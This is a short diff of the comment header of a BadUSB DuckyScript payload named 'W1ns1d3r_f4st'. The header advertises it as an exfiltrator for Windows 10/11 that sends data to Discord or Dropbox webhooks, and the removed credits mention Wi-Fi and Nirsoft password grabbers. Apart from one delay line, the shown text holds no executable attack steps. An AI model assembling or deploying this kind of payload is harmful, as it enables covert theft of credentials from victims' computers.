@@ -1,14 +1,23 @@
-REM Title: W1ns1d3r
+REM Title: W1ns1d3r_f4st
 REM Author: Kali-Gvte (https://github.com/Gvte-Kali/BadStuffHosting/tree/main/W1ns1d3r)
 REM Version: 2.3
-REM Credit Discord webhooks functions + ideas :I-am-jakoby
-REM Credit Wifi grabber : 7h30th3r0n3 and the0bone
-REM Credit Password Nirsoft : moosehadley
-REM Target:  Windows 10/11 (7/8 not tested)
-REM Supported Layout keyboard: US/FR/DE
-REM
 REM Most awesome Exfiltrator !!
 REM
+REM
+REM 888      d888                             888          d8888                            d8888  
+REM 888     d8888                             888         d8P888                           d8P888  
+REM 888       888                             888        d8P 888                          d8P 888  
+REM 88888b.   888   .d88b.           88888b.  88888b.   d8P  888  888d888 88888b.d88b.   d8P  888  
+REM 888 "88b  888  d88P"88b          888 "88b 888 "88b d88   888  888P"   888 "888 "88b d88   888  
+REM 888  888  888  888  888          888  888 888  888 8888888888 888     888  888  888 8888888888 
+REM 888 d88P  888  Y88b 888          888 d88P 888  888       888  888     888  888  888       888  
+REM 88888P" 8888888 "Y88888 88888888 88888P"  888  888       888  888     888  888  888       888  
+REM                     888          888                                                           
+REM                Y8b d88P          888                                                           
+REM                 "Y88P"           888                                                           
+REM
+REM
+REM Uses only the stage2.ps1 to bes as fas as possinble
 REM Usage : Put your discord and/or dropbox WEBHOOK and enjoy !
 REM
 DELAY 2000
